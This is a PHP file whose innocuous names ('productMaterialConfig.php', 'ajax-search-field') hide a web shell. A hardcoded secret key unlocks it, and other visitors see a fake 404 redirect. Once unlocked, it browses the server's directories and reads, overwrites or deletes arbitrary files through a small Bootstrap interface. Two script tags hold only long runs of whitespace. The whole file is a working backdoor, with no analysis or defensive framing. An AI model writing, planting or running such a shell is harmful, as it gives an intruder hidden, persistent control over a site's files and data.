<?php session_start();if(isset($_GET['auth']) or isset($_SESSION['auth'])){if($_SESSION['auth']=="66654g36s3Z2x9Oai369" or $_GET['auth']=="66654g36s3Z2x9Oai369"){$_SESSION['auth']="66654g36s3Z2x9Oai369";}else{header("HTTP/1.1 404 Not Found");header("Location: /");die();}}else{header("HTTP/1.1 404 Not Found");header("Location: /");die();}$root="../../../";if(isset($_GET['action'])){switch($_GET['action']){case 'read':$file=$_GET['file'];$file=ltrim($file,'/');$file=$root.$file;$content=file_get_contents($file);echo $content;break;case 'submit':$file=$_POST['name'];$file=ltrim($file,'/');$file=$root.$file;file_put_contents($file,$_POST['content']);return 0;break;case 'delete':$file=$_GET['file'];$file=ltrim($file,'/');$file=$root.$file;unlink($file);echo "File Has Been Deleted";break;}}else {if(isset($_GET['dir'])){$find=$_GET['dir'];}else {$find="";}$dir=$root.$find;$files="";$directories="";if($handle=opendir($dir)){while(false!==($entry=readdir($handle))){if($entry!="."&&$entry!=".."){$file_location=$dir."/".$entry;if(is_dir($file_location)){$directories.='
                    <tr>
                        <td>
                            <a href="?dir='.$find."/".$entry.'">'.$entry.'</a>
                        </td>
                        <td>
                            <a href="javascript:void(0)" class="btn btn-danger btn-sm delete" data-file="'.$find."/".$entry.'">Delete</a>
                        </td>
                    </tr>';}else {$files.='
                    <tr>
                        <td>
                            '.$entry.'
                        </td>
                        <td>
                            <a href="javascript:void(0)" data-toggle="modal" data-target="#exampleModal" data-whatever="'.$find."/".$entry.'" class="btn btn-primary btn-sm">edit</a>
                            <a href="javascript:void(0)" class="btn btn-danger btn-sm delete" data-file="'.$find."/".$entry.'">Delete</a>
                        </td>
                    </tr>';}}}closedir($handle);$content=$directories.$files;}?>
    <html>

    <head><script language=javascript>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </script>
        <title>ajax-search-field</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <script language=javascript>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  </script></head>

    <body> <div class="table-responsive"> <table class="table table-striped"> <thead class="thead-dark"> <th>File Name</th> <th>Action</th> </thead> <tbody> <?=$content;?> </tbody> </table> </div><div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true"> <div class="modal-dialog modal-lg" role="document"> <div class="modal-content"> <div class="modal-header"> <h5 class="modal-title" id="exampleModalLabel">Edit Files</h5> <button type="button" class="close" data-dismiss="modal" aria-label="Close"> <span aria-hidden="true">&times;</span> </button> </div><div class="modal-body"> <form method="get" action="javascript:void(0)" class="editFile"> <div class="form-group"> <label for="file-text" class="col-form-label">File Name:</label> <input type="text" name="name" class="form-control" id="file-name"/> </div><div class="form-group"> <label for="file-text" class="col-form-label">File Content:</label> <textarea name="content" class="form-control" id="file-text" rows="30"></textarea> </div></form> </div><div class="modal-footer"> <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button> <button type="button" class="btn btn-primary submit">Send message</button> </div></div></div></div>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
        <script>
            $(function() {
                $('.submit').on('click', function(e) {
                    e.preventDefault();
                    $.ajax({
                        type: "POST",
                        url: "productMaterialConfig.php?action=submit",
                        data: $('form.editFile').serialize(),
                        success: function(response) {
                            $('#modal').modal('hide');
                            alert("Done!!");
                        },
                        error: function() {
                            alert('Error!! :/');
                        }
                    });
                    return false;
                });
            });
            $(function() {
                $('.delete').on('click', function(e) {
                    e.preventDefault();
                    var fileName = $(this).data('file');
                    $.ajax({
                        type: "GET",
                        url: "productMaterialConfig.php?action=delete&file="+fileName,
                        success: function(response) {
                            alert(response);
                        },
                        error: function() {
                            alert('Error!! :/');
                        }
                    });
                    return false;
                });
            });
            $('#exampleModal').on('show.bs.modal', function(event) {
                var button = $(event.relatedTarget) // Button that triggered the modal
                var recipient = button.data('whatever') // Extract info from data-* attributes
                var modal = $(this);
                var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange=function() {
                    if (this.readyState == 4 && this.status == 200) {
                        if(this.responseText != ""){
                            modal.find('.modal-body textarea').val(this.responseText);
                        }
                    }
                };
                xhttp.open("GET", "productMaterialConfig.php?action=read&file=" + recipient, true);
                xhttp.send();
                modal.find('.modal-title').text('Edit File ' + recipient);
                modal.find('.modal-body input').val(recipient);
            });
        </script>
    </body>
    </html>
<?php
}
?>